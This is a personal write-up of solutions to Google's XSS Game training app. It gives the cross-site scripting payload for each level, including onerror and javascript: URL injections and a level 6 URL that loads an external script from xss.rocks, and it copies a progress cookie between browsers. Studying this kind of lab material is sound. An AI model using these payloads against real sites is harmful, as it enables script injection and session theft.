# Notes on Google's [XSS Game][1] Web App

## Levels 1 & 2

```html
<img src=x onerror="alert('xss')"></img>
```
```
" onerror=alert('xss')/> <img src="cloud1.jpg">
```

## Level 3
To get past Level 3 I had to use Safari (10.0.3) because Firefox (51.0.1) and Chrome (55.0.2883.95) both prevented the injection of a space, encoded or not, after the single quote. Here is the full URL I used to successfully pass Level 3 with Safari:
```
https://xss-game.appspot.com/level3/frame' onerror="alert('xss')"
```
But I wanted to keep working with Firefox. So I stole Safari's cookie called "level3".
I configured Safari to use the Burp proxy, then copied the name and value of the third cookie:
```
level1=f148716ef4ed1ba0f192cde4618f8dc5; level2=b5e530302374aa71cc3028c810b63641; level3=d5ce029d0680b3816a349da0d055fcfa
```
Here's how to set a new cookie in FF or Chrome using the console in dev tools:
```javascript
document.cookie="level3=d5ce029d0680b3816a349da0d055fcfa";
```
Now you can advance to level 4 in FF or Chrome.

## Level 4

https://xss-game.appspot.com/level4

For Level 4 I had to look up somebody else's answer and play with it because it was not working as they described. Eventually I found that, in all three browsers, it only worked if you input it into the input field. It would not work on the URL.
```
');alert();var b=('
```

## Level 5
I got through Level 5 with this URL:
```
https://xss-game.appspot.com/level5/frame/signup?next=javascript:alert(1)
```
But clicking the Go button next to the URL did not work. I had to actually click the "Next >>" button. That button, if you mouse over it, showed that it's target was:
```
javascript:alert(1)
```

By me having edited the URL manually, that button's href value had changed to my input.


## Level 6
For Level 6 I had to look up the answer. It turns out that the regex was not case sensitive, so this is the successful URL:
```
https://xss-game.appspot.com/level6/frame#HTTPS://xss.rocks/xss.js
```
[1]: https://xss-game.appspot.com/
